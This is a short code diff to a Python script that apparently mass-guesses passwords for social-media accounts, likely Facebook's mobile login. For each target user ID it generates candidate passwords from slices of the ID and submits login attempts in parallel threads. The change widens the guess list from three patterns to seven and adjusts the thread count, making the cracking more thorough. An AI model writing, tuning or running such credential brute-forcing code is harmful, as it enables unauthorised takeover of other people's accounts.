@@ -629,7 +629,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=28) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -639,7 +639,7 @@ def SUMON2():
         for guru in user:
             uid = kode+guru
             mk = uid[:8]
-            pwx = [uid[:6],uid,mk]
+            pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid,uid[2:],uid[4:]]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
